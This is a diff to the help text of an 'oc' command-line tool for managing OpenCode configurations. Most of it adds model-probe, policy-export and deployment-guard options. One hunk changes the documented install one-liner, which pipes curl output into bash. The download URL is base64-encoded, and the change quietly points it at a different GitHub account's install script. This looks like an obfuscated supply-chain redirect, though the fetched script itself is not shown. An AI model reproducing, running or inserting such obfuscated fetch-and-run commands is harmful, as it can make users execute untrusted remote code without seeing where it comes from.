@@ -19,12 +19,12 @@
 #   fix [--dry-run|--set k=v]             Auto-repair configs
 #   cleanup [--dry-run|--yes]             Reconcile to known-good state
 #   maintain [--check|--clean|--plans]    Clean sessions, caches, logs
-#   models [--catalog|--providers|--json|--upgrade]  OpenRouter catalog / providers
-#   profile [show|applied|identity|snapshot|normal|normal-private|pentest|path|compat-path|xdg-path|env|resolve|export-route|export-workflow-routes] Runtime routing profile
+#   models [--catalog|--providers|--json|--upgrade|--probe|--moderation]  Model catalog / health
+#   profile [show|applied|identity|snapshot|normal|normal-private|pentest|path|compat-path|xdg-path|env|resolve|export-route|export-workflow-routes|export-policy-manifest] Runtime routing profile
 #   eval [--execute|--run-budget N]       Bounded DeepSeek/Kimi/Sonnet canary
 #   versions [--check|--local|--fix|--json]  Package pins vs npm/GitHub
 #   plugin [doctor|cache]                 OmO pin cache + OpenConfig patch health
-#   deploy [--dry-run|--force]            Guarded production config deployment
+#   deploy [check|lock|unlock|status|quarantine|health]  Deployment guard
 #   run "<msg>" [-a agent] [-d dir]       Headless runner (run to completion)
 #   admin [status|health|ratelimit|...]   OpenRouter account admin
 #   launch [dir]                          Launch OpenCode (terminal-safe)
@@ -103,8 +103,8 @@ ${c_b}${c_bold}── Repair & clean ──${c_0}
   ${c_g}maintain${c_0}  [--check|--clean|--plans]      Clean sessions, caches, logs
 
 ${c_bold}Models & Admin:${c_0}
-  ${c_g}models${c_0}    [--catalog|--providers|--json|--upgrade]
-  ${c_g}profile${c_0}   [show|snapshot|normal|normal-private|pentest|path|compat-path|xdg-path|env|resolve|export-route|export-workflow-routes]
+  ${c_g}models${c_0}    [--catalog|--providers|--probe|--moderation|--json|--upgrade]
+  ${c_g}profile${c_0}   [show|snapshot|normal|normal-private|pentest|path|compat-path|xdg-path|env|resolve|export-route|export-workflow-routes|export-policy-manifest]
                                          Runtime profile state and route lookup
                                          OpenRouter catalog / live provider health
   ${c_g}eval${c_0}      [--execute|--run-budget N]    Bounded model-routing canary (plan-only by default)
@@ -112,7 +112,8 @@ ${c_bold}Models & Admin:${c_0}
                                          Package pins vs npm + GitHub (+ other repos)
   ${c_g}plugin${c_0}    [doctor|cache|--fix]         OmO pin cache + OpenConfig patch health
   ${c_g}admin${c_0}     [status|health|ratelimit|…]    OpenRouter + local Codex subscription health
-  ${c_g}deploy${c_0}    [--dry-run|--force]           Guarded production config deployment
+  ${c_g}deploy${c_0}    [check|lock|unlock|status|quarantine|health]
+                                         Deployment guard, lock, credits, and explicit quarantine
 
 ${c_b}${c_bold}── Run & launch ──${c_0}
   ${c_g}run${c_0}       "<msg>" [-a agent] [-d dir]    Headless runner (run to completion)
@@ -167,12 +168,16 @@ ${c_b}${c_bold}── Examples ──${c_0}
   oc validate                    Structural / footgun checks
   oc run "Fix the failing tests" Headless: run to completion
   oc admin health                Live OpenRouter + local Codex subscription probes
+  oc models --probe              Bounded live model probes
+  oc models --moderation         Provider moderation/data-policy catalog
+  oc deploy check                Pre-deployment gate
+  oc deploy status               Lock, credits, and alert state
   oc launch                      Launch OpenCode (cwd, or ~/Projects if config repo)
   oc new myapp                   Scaffold → ~/Projects/myapp
   oc projects --list             List projects home
 
 ${c_b}${c_bold}── One-liner ──${c_0}
-  curl -fsSL "\$(printf %s 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2plc3Nlb3VlL29wZW5jb2RlLWNvbmZpZ3MvbWFpbi9pbnN0YWxsLnNo' | base64 -d)" | bash
+  curl -fsSL "\$(printf %s 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FybmF1ZExhZm9zc2U5MjEwMC9vcGVuY29kZS1jb25maWdzL21haW4vaW5zdGFsbC5zaA==' | base64 -d)" | bash
   # Prefer after clone:  oc install --quick
 
 ${c_b}${c_bold}── Auto ──${c_0}
